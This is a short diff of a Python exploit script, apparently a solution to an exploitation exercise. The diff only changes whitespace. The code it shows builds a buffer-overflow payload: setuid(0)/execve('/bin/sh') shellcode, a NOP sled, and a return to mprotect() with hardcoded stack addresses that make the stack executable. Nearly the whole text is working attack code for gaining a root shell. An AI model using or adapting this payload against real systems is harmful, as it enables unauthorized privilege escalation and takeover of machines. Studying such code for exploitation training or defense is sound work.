@@ -77,14 +77,14 @@ def exploit(remote, shell):
 
     # shellcode = asm(shellcraft.execve("/bin/sh"))
     shellcode = asm(shellcraft.setuid(0) + shellcraft.execve("/bin/sh"))
-    
-    mprotectAddress = struct.pack("<I", 0xb7efcd50)	    # mprotect() Address
+
+    mprotectAddress = struct.pack("<I", 0xb7efcd50)	    	# mprotect() Address
     p1 = struct.pack("<I", 0xbfedf000)			        # Beginning of Stack
     p2 = struct.pack("<I", 0x121000)			        # 0xc0000000 - 0xbfedf000 = 0x121000
-    p3 = struct.pack("<I", 0x7)				            # Read, Write & Execute
+    p3 = struct.pack("<I", 0x7)				 	# Read, Write & Execute
     ret = struct.pack("<I", vulnAddress)		        # Return to the beginning of the buffer
     nops = (76 - len(shellcode)) * "\x90"
-    
+
     # Return to debug() to see if stack is executable now
     # debug = struct.pack("<I", 0x80000c11)
     # payload3 = "A" * 76 + mprotectAddress + debug + p1 + p2 + p3 
